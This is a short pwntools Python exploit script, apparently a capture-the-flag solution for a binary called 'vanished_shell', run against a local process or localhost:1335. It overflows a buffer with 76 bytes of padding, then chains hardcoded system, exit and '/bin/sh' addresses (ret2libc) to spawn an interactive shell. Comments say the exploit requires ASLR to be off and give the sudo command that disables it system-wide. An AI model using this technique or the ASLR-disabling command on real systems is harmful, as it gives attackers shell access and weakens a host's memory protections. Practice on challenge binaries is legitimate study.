#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import argparse
from pwn import *

parser = argparse.ArgumentParser()
parser.add_argument("-m", "--mode", required=True, choices=["d", "debug", "r", "remote"])
args = parser.parse_args()

context(arch="amd64", endian='el', os="linux")
context.log_level = "debug"

if args.mode in ["d", "debug"]:
    atk = process('./vanished_shell')
    #libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
    chall = ELF('./vanished_shell', checksec=True)
    payload_system = p32(0xf7dd38e0) # p system
    payload_exit = p32(0xf7dc25b0) # p exit
    payload_sh = p32(0xf7f3ede8)
else:
    atk = remote('localhost', 1335)
    #libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
    chall = None
    payload_system = p32(0xf7dd88e0)
    payload_exit = p32(0xf7dc75b0)
    payload_sh = p32(0xf7f45de8)

# Trick the tool:
    # find system,+999999999,"/bin/sh"
    # 0xf7f45de8
    # warning: Unable to access 16000 bytes
    # of target memory at 0xf7fbb0f0,
    # halting search. 1 pattern found.

# Must turn off ASLR
# echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

# Payloads
offset = b"A" * 76
# payload_win = p32(0x8049196)

atk.recvuntil(b"What do you want to solve?")
# atk.sendline(offset + payload_win)
atk.sendline(offset + payload_system + payload_exit + payload_sh)

atk.interactive()
